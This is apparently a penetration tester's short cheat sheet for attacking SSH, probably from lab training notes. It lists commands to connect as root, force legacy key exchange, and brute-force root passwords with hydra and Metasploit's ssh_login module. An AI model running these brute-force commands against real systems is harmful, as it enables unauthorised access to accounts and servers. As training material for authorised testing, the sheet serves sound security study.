## SSH Penetration Testing

### Login to SSH
`ssh root@10.11.1.140`

### If older box or SSH won't connect due to key exchange
`ssh <ip> -oKexAlgorithms=+<key-type> -c <cipher-type>`

### Brute forcing SSH
```
# Brute force SSH, replace 10.11.1.140 with target ip
hydra -e nsr -l root -P /root/Desktop/wordlists/10_million_password_list_top_100000.txt 10.11.1.140 ssh -t 4

# or with this syntax
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<ip>:22 -t 4 -V
```

### Brute forcing SSH with Metasploit
```
msf5 auxiliary(scanner/ssh/ssh_login) > set bruteforce_speed 2
bruteforce_speed => 2
msf5 auxiliary(scanner/ssh/ssh_login) > set threads 5
threads => 5
```

### Close SSH connection
`~.`
